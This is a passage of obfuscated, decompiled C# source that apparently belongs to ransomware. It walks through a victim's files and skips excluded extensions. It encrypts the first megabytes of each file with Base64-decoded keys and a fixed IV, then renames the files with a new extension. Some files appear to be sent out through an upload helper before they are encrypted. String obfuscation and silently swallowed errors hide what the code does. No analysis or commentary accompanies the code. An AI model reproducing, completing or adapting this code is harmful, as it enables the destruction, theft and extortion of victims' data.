				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039b;
					}
				}
				if ((dJsRlxFlxsNlxDqFIG == getString_0(107397017) && !item.EndsWith(text)) || qiPmErxJQggVfu.Contains(item))
				{
					continue;
				}
				if (LzcJtwyMvPk == getString_0(107396760))
				{
					try
					{
						if (RcKeWyoHTAZmyg.bImTDnckNcn(item))
						{
							RcKeWyoHTAZmyg.WgslsCSGTygL(item);
						}
					}
					catch
					{
					}
				}
				qiPmErxJQggVfu.Add(item);
				if (!FXuQVyDsFHEyD.Contains(Path.GetDirectoryName(item)))
				{
					FXuQVyDsFHEyD.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (gdbMFWmQXamr == getString_0(107396760) && fileStream.Length > Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024 && !list3.Contains(text))
					{
						if (WaGdjztjPUPAi == getString_0(107396760))
						{
							foreach (string item2 in VhmHymKdwdhl)
							{
								if (item.ToLower().EndsWith(item2) && DqotASAdvjyOTQWi == getString_0(107396760))
								{
									if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389242), getString_0(107389269), getString_0(107389256), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && DqotASAdvjyOTQWi == getString_0(107397017))
								{
									try
									{
										WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389242), getString_0(107389269), getString_0(107389256), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = nkFelzsRBEm.KQWFCtUZBKxS(item, Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024);
						byte[] uxCXotfEsZFZTBQK = nkFelzsRBEm.qpZLeuvzdxLp(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						nkFelzsRBEm.AHsEILkRsKltd(item, uxCXotfEsZFZTBQK);
						if (string_2 != getString_0(107386428))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386428))
					{
						lwEEvsRYHQlDF(item, item + string_2, kQukpPiiliUKcIy);
					}
					else
					{
						lwEEvsRYHQlDF(item, item + getString_0(107386423), kQukpPiiliUKcIy);
					}
				}
				catch (Exception)
				{
				}
				IL_039b:;
			}
		}
	}

	public static void xhnNiqRaFQf(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		NKqHkELnIQFAdV.RLIRUjhtaFzWnqh CS_0024_003C_003E8__locals0 = new NKqHkELnIQFAdV();
		CS_0024_003C_003E8__locals0.LVrYlUqqoFMQv = list_0;
		CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq = string_1;
		CS_0024_003C_003E8__locals0.QFkuNBCHafFJy = string_2;
		CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd = string_3;
		CS_0024_003C_003E8__locals0.JaKvZGejuOExipBPj = new List<string> { getString_0(107389193) };
		if (dJsRlxFlxsNlxDqFIG == getString_0(107397017))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.LVrYlUqqoFMQv)
				{
					if (CS_0024_003C_003E8__locals0.QFkuNBCHafFJy.Length != 0)
					{
						string[] qFkuNBCHafFJy2 = CS_0024_003C_003E8__locals0.QFkuNBCHafFJy;
						int num2 = 0;
						while (num2 < qFkuNBCHafFJy2.Length)
						{
							string value2 = qFkuNBCHafFJy2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09e2;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq))
						{
							goto IL_09e2;
						}
					}
					catch (Exception)
					{
						goto IL_09e2;
					}
					if (item.EndsWith(string_0) && !qiPmErxJQggVfu.Contains(item))
					{
						if (LzcJtwyMvPk == NKqHkELnIQFAdV.getString_0(107396779))
						{
							try
							{
								if (RcKeWyoHTAZmyg.bImTDnckNcn(item))
								{
									RcKeWyoHTAZmyg.WgslsCSGTygL(item);
								}
							}
							catch
							{
							}
						}
						qiPmErxJQggVfu.Add(item);
						if (!FXuQVyDsFHEyD.Contains(Path.GetDirectoryName(item)))
						{
							FXuQVyDsFHEyD.Add(Path.GetDirectoryName(item));
						}
						AmaXDscuvVuN(item);
						try
						{
							new VUCsXWNVIeskrL().jSQKoCNPHlxV(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (pjFetgiEucLksJ)
									{
										Console.WriteLine(NKqHkELnIQFAdV.getString_0(107403736) + item + NKqHkELnIQFAdV.getString_0(107403691) + new FileInfo(item).Length + NKqHkELnIQFAdV.getString_0(107403670));
										Console.WriteLine(NKqHkELnIQFAdV.getString_0(107403661));
									}
								}
								catch
								{
								}
								nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(NKqHkELnIQFAdV.getString_0(107403076)), NKqHkELnIQFAdV.getString_0(107388227) + item + NKqHkELnIQFAdV.getString_0(107388227) + NGKPoQcRFBDfbNt(NKqHkELnIQFAdV.getString_0(107403019)) + NKqHkELnIQFAdV.getString_0(107388227) + Environment.UserName + NKqHkELnIQFAdV.getString_0(107388227) + NGKPoQcRFBDfbNt(NKqHkELnIQFAdV.getString_0(107403034)));
							}
						}
						catch (Exception ex18)
						{
							if (yqFjfeWQNnFtS)
							{
								try
								{
									File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + item + NKqHkELnIQFAdV.getString_0(107403009) + ex18.Message + NKqHkELnIQFAdV.getString_0(107396708));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex20)
							{
								if (yqFjfeWQNnFtS)
								{
									try
									{
										File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + item + NKqHkELnIQFAdV.getString_0(107402896) + ex20.Message + NKqHkELnIQFAdV.getString_0(107396708));
									}
									catch (Exception)
									{
									}
								}
								IkmoiloXkEwN++;
								goto end_IL_02cd_2;
							}
							if (!(gdbMFWmQXamr == NKqHkELnIQFAdV.getString_0(107396779)) || new FileInfo(item).Length <= Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024 || CS_0024_003C_003E8__locals0.JaKvZGejuOExipBPj.Contains(string_0))
							{
								if (YkwjPTGZpc)
								{
									CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq = EYBkUQfzxCUj + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq;
								}
								byte[] bytes3 = Encoding.ASCII.GetBytes(ydOQhvmvcpZ);
								if (CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq != NKqHkELnIQFAdV.getString_0(107386447))
								{
									if (!GPXFyHxJVGs)
									{
										if (!kGnGVVSmVYCjkQ)
										{
											yaxtgGEmAXdl(item, item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, kQukpPiiliUKcIy);
										}
										else
										{
											yaxtgGEmAXdl(item, item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd));
										}
									}
									else
									{
										try
										{
											if (!kGnGVVSmVYCjkQ)
											{
												oRXdQfZZjJ(item, item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, kQukpPiiliUKcIy, Convert.FromBase64String(NfvyHzKylGMJES));
											}
											else
											{
												oRXdQfZZjJ(item, item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES));
											}
										}
										catch (Exception ex22)
										{
											if (yqFjfeWQNnFtS)
											{
												try
												{
													File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + item + NKqHkELnIQFAdV.getString_0(107386465) + ex22.Message + NKqHkELnIQFAdV.getString_0(107396708));
												}
												catch (Exception)
												{
												}
											}
											IkmoiloXkEwN++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!GPXFyHxJVGs)
								{
									if (!kGnGVVSmVYCjkQ)
									{
										yaxtgGEmAXdl(item, item + NKqHkELnIQFAdV.getString_0(107386442), kQukpPiiliUKcIy);
									}
									else
									{
										yaxtgGEmAXdl(item, item + NKqHkELnIQFAdV.getString_0(107386442), Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd));
									}
								}
								else
								{
									try
									{
										if (!kGnGVVSmVYCjkQ)
										{
											oRXdQfZZjJ(item, item, kQukpPiiliUKcIy, Convert.FromBase64String(NfvyHzKylGMJES));
										}
										else
										{
											oRXdQfZZjJ(item, item, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES));
										}
									}
									catch (Exception ex25)
									{
										if (yqFjfeWQNnFtS)
										{
											try
											{
												File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + item + NKqHkELnIQFAdV.getString_0(107386465) + ex25.Message + NKqHkELnIQFAdV.getString_0(107396708));
											}
											catch (Exception)
											{
											}
										}
										IkmoiloXkEwN++;
										goto end_IL_02cd_2;
									}
								}
								if (kGnGVVSmVYCjkQ)
								{
									if (CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq != NKqHkELnIQFAdV.getString_0(107386447))
									{
										coknNVwPlVpucD(item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, bytes3);
									}
									else
									{
										coknNVwPlVpucD(item, bytes3);
									}
								}
								goto IL_09e2;
							}
							CS_0024_003C_003E8__locals0 = new NKqHkELnIQFAdV.KcOfYZWbGeBpi();
							CS_0024_003C_003E8__locals0.EKHcYJNBcJOCWS = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq != NKqHkELnIQFAdV.getString_0(107386447))
								{
									if (YkwjPTGZpc)
									{
										CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq = EYBkUQfzxCUj + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq);
								}
							}
							catch (Exception ex27)
							{
								if (yqFjfeWQNnFtS)
								{
									try
									{
										File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + item + NKqHkELnIQFAdV.getString_0(107403347) + ex27.Message + NKqHkELnIQFAdV.getString_0(107396708));
									}
									catch (Exception)
									{
									}
								}
								IkmoiloXkEwN++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.GOgkaVwGIyZi = NKqHkELnIQFAdV.getString_0(107389212);
							if (CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq != NKqHkELnIQFAdV.getString_0(107386447))
							{
								CS_0024_003C_003E8__locals0.GOgkaVwGIyZi = item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq;
							}
							else
							{
								CS_0024_003C_003E8__locals0.GOgkaVwGIyZi = item;
							}
							if (WaGdjztjPUPAi == NKqHkELnIQFAdV.getString_0(107396779))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in VhmHymKdwdhl)
									{
										if (CS_0024_003C_003E8__locals0.GOgkaVwGIyZi.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.EKHcYJNBcJOCWS.UfmIFRSQHUmOrq) && DqotASAdvjyOTQWi == NKqHkELnIQFAdV.KcOfYZWbGeBpi.getString_0(107396782))
										{
											if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.GOgkaVwGIyZi).Length)
											{
												try
												{
													WspNJLioodtR.diqCpqybOKjOLc(NKqHkELnIQFAdV.KcOfYZWbGeBpi.getString_0(107389264), NKqHkELnIQFAdV.KcOfYZWbGeBpi.getString_0(107389291), NKqHkELnIQFAdV.KcOfYZWbGeBpi.getString_0(107389278), CS_0024_003C_003E8__locals0.GOgkaVwGIyZi);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.GOgkaVwGIyZi.ToLower().EndsWith(item2) && DqotASAdvjyOTQWi == NKqHkELnIQFAdV.KcOfYZWbGeBpi.getString_0(107397039))
										{
											try
											{
												WspNJLioodtR.diqCpqybOKjOLc(NKqHkELnIQFAdV.KcOfYZWbGeBpi.getString_0(107389264), NKqHkELnIQFAdV.KcOfYZWbGeBpi.getString_0(107389291), NKqHkELnIQFAdV.KcOfYZWbGeBpi.getString_0(107389278), CS_0024_003C_003E8__locals0.GOgkaVwGIyZi);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							byte[] bytes4 = Encoding.ASCII.GetBytes(ydOQhvmvcpZ);
							if (ibVWwozpAGuIfs == NKqHkELnIQFAdV.getString_0(107397036))
							{
								byte[] array2 = null;
								byte[] byte_2 = nkFelzsRBEm.KQWFCtUZBKxS(CS_0024_003C_003E8__locals0.GOgkaVwGIyZi, Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024);
								if (nkFelzsRBEm.AHsEILkRsKltd(uxCXotfEsZFZTBQK: (!ZefUNZPKuQWv) ? (kGnGVVSmVYCjkQ ? nkFelzsRBEm.qpZLeuvzdxLp(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nkFelzsRBEm.qpZLeuvzdxLp(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (kGnGVVSmVYCjkQ ? IkRHWwmJhhri.lrXUmqEbANrrJ(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES)) : IkRHWwmJhhri.lrXUmqEbANrrJ(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES))), nkUKfOqpmmlHAa: CS_0024_003C_003E8__locals0.GOgkaVwGIyZi, arqeKzgafBs: bytes4))
								{
									goto IL_09e2;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!kGnGVVSmVYCjkQ)
							{
								if (PzYVJbOTPet.oJAyLxHDaqpVBf(CS_0024_003C_003E8__locals0.GOgkaVwGIyZi, gFTAyVipGERPhv, CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd, null, Convert.FromBase64String(NfvyHzKylGMJES)))
								{
									goto IL_09e2;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (PzYVJbOTPet.oJAyLxHDaqpVBf(CS_0024_003C_003E8__locals0.GOgkaVwGIyZi, gFTAyVipGERPhv, CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd, bytes4, Convert.FromBase64String(NfvyHzKylGMJES)))
								{
									goto IL_09e2;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09e2;
						}
					}
					continue;
					IL_09e2:
					CS_0024_003C_003E8__locals0.LVrYlUqqoFMQv.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.LVrYlUqqoFMQv, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new NKqHkELnIQFAdV.RLIRUjhtaFzWnqh();
			CS_0024_003C_003E8__locals0.EKHcYJNBcJOCWS = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.wKxAvZiJPQtO = string_0;
			if (CS_0024_003C_003E8__locals0.QFkuNBCHafFJy.Length != 0)
			{
				string[] qFkuNBCHafFJy = CS_0024_003C_003E8__locals0.QFkuNBCHafFJy;
				int num = 0;
				while (num < qFkuNBCHafFJy.Length)
				{
					string value = qFkuNBCHafFJy[num];
					if (!CS_0024_003C_003E8__locals0.wKxAvZiJPQtO.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac2;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.wKxAvZiJPQtO.EndsWith(CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq))
				{
					goto IL_0ac2;
				}
			}
			catch (Exception)
			{
				goto IL_0ac2;
			}
			if (!qiPmErxJQggVfu.Contains(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO))
			{
				if (LzcJtwyMvPk == NKqHkELnIQFAdV.getString_0(107396779))
				{
					try
					{
						if (RcKeWyoHTAZmyg.bImTDnckNcn(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO))
						{
							RcKeWyoHTAZmyg.WgslsCSGTygL(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
						}
					}
					catch
					{
					}
				}
				qiPmErxJQggVfu.Add(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
				if (!FXuQVyDsFHEyD.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO)))
				{
					FXuQVyDsFHEyD.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO));
				}
				AmaXDscuvVuN(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
				try
				{
					new VUCsXWNVIeskrL().jSQKoCNPHlxV(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (pjFetgiEucLksJ)
							{
								Console.WriteLine(NKqHkELnIQFAdV.getString_0(107403736) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107403691) + new FileInfo(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO).Length + NKqHkELnIQFAdV.getString_0(107403670));
								Console.WriteLine(NKqHkELnIQFAdV.getString_0(107403661));
							}
						}
						catch
						{
						}
						nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(NKqHkELnIQFAdV.getString_0(107403076)), NKqHkELnIQFAdV.getString_0(107388227) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107388227) + NGKPoQcRFBDfbNt(NKqHkELnIQFAdV.getString_0(107403019)) + NKqHkELnIQFAdV.getString_0(107388227) + Environment.UserName + NKqHkELnIQFAdV.getString_0(107388227) + NGKPoQcRFBDfbNt(NKqHkELnIQFAdV.getString_0(107403034)));
					}
				}
				catch (Exception ex2)
				{
					if (yqFjfeWQNnFtS)
					{
						try
						{
							File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107403009) + ex2.Message + NKqHkELnIQFAdV.getString_0(107396708));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (yqFjfeWQNnFtS)
						{
							try
							{
								File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107402896) + ex4.Message + NKqHkELnIQFAdV.getString_0(107396708));
							}
							catch (Exception)
							{
							}
						}
						IkmoiloXkEwN++;
						goto end_IL_031d_2;
					}
					if (gdbMFWmQXamr == NKqHkELnIQFAdV.getString_0(107396779) && new FileInfo(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO).Length > Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq != NKqHkELnIQFAdV.getString_0(107386447))
							{
								if (YkwjPTGZpc)
								{
									CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq = EYBkUQfzxCUj + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq;
								}
								File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq);
							}
						}
						catch (Exception ex6)
						{
							if (yqFjfeWQNnFtS)
							{
								try
								{
									File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107403347) + ex6.Message + NKqHkELnIQFAdV.getString_0(107396708));
								}
								catch (Exception)
								{
								}
							}
							IkmoiloXkEwN++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq != NKqHkELnIQFAdV.getString_0(107386447))
						{
							CS_0024_003C_003E8__locals0.wKxAvZiJPQtO += CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq;
						}
						if (WaGdjztjPUPAi == NKqHkELnIQFAdV.getString_0(107396779))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in VhmHymKdwdhl)
								{
									if (CS_0024_003C_003E8__locals0.wKxAvZiJPQtO.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.EKHcYJNBcJOCWS.UfmIFRSQHUmOrq) && DqotASAdvjyOTQWi == NKqHkELnIQFAdV.RLIRUjhtaFzWnqh.getString_0(107396785))
									{
										if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO).Length)
										{
											try
											{
												WspNJLioodtR.diqCpqybOKjOLc(NKqHkELnIQFAdV.RLIRUjhtaFzWnqh.getString_0(107389267), NKqHkELnIQFAdV.RLIRUjhtaFzWnqh.getString_0(107389294), NKqHkELnIQFAdV.RLIRUjhtaFzWnqh.getString_0(107389281), CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.wKxAvZiJPQtO.ToLower().EndsWith(item3) && DqotASAdvjyOTQWi == NKqHkELnIQFAdV.RLIRUjhtaFzWnqh.getString_0(107397042))
									{
										try
										{
											WspNJLioodtR.diqCpqybOKjOLc(NKqHkELnIQFAdV.RLIRUjhtaFzWnqh.getString_0(107389267), NKqHkELnIQFAdV.RLIRUjhtaFzWnqh.getString_0(107389294), NKqHkELnIQFAdV.RLIRUjhtaFzWnqh.getString_0(107389281), CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						byte[] bytes = Encoding.ASCII.GetBytes(ydOQhvmvcpZ);
						if (ibVWwozpAGuIfs == NKqHkELnIQFAdV.getString_0(107397036))
						{
							byte[] array = null;
							byte[] byte_ = nkFelzsRBEm.KQWFCtUZBKxS(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, Convert.ToInt32(gFTAyVipGERPhv) * 1024 * 1024);
							if (!nkFelzsRBEm.AHsEILkRsKltd(uxCXotfEsZFZTBQK: (!ZefUNZPKuQWv) ? (kGnGVVSmVYCjkQ ? nkFelzsRBEm.qpZLeuvzdxLp(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nkFelzsRBEm.qpZLeuvzdxLp(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (kGnGVVSmVYCjkQ ? IkRHWwmJhhri.lrXUmqEbANrrJ(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES)) : IkRHWwmJhhri.lrXUmqEbANrrJ(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES))), nkUKfOqpmmlHAa: CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, arqeKzgafBs: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!kGnGVVSmVYCjkQ)
						{
							if (!PzYVJbOTPet.oJAyLxHDaqpVBf(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, gFTAyVipGERPhv, CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd, null, Convert.FromBase64String(NfvyHzKylGMJES)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!PzYVJbOTPet.oJAyLxHDaqpVBf(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, gFTAyVipGERPhv, CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd, bytes, Convert.FromBase64String(NfvyHzKylGMJES)))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (YkwjPTGZpc)
						{
							CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq = EYBkUQfzxCUj + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq;
						}
						byte[] bytes2 = Encoding.ASCII.GetBytes(ydOQhvmvcpZ);
						if (CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq != NKqHkELnIQFAdV.getString_0(107386447))
						{
							if (!GPXFyHxJVGs)
							{
								if (!kGnGVVSmVYCjkQ)
								{
									yaxtgGEmAXdl(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, kQukpPiiliUKcIy);
								}
								else
								{
									yaxtgGEmAXdl(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd));
								}
							}
							else
							{
								try
								{
									if (!kGnGVVSmVYCjkQ)
									{
										oRXdQfZZjJ(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, kQukpPiiliUKcIy, Convert.FromBase64String(NfvyHzKylGMJES));
									}
									else
									{
										oRXdQfZZjJ(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES));
									}
								}
								catch (Exception ex11)
								{
									if (yqFjfeWQNnFtS)
									{
										try
										{
											File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107386465) + ex11.Message + NKqHkELnIQFAdV.getString_0(107396708));
										}
										catch (Exception)
										{
										}
									}
									IkmoiloXkEwN++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!GPXFyHxJVGs)
						{
							if (!kGnGVVSmVYCjkQ)
							{
								yaxtgGEmAXdl(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107386442), kQukpPiiliUKcIy);
							}
							else
							{
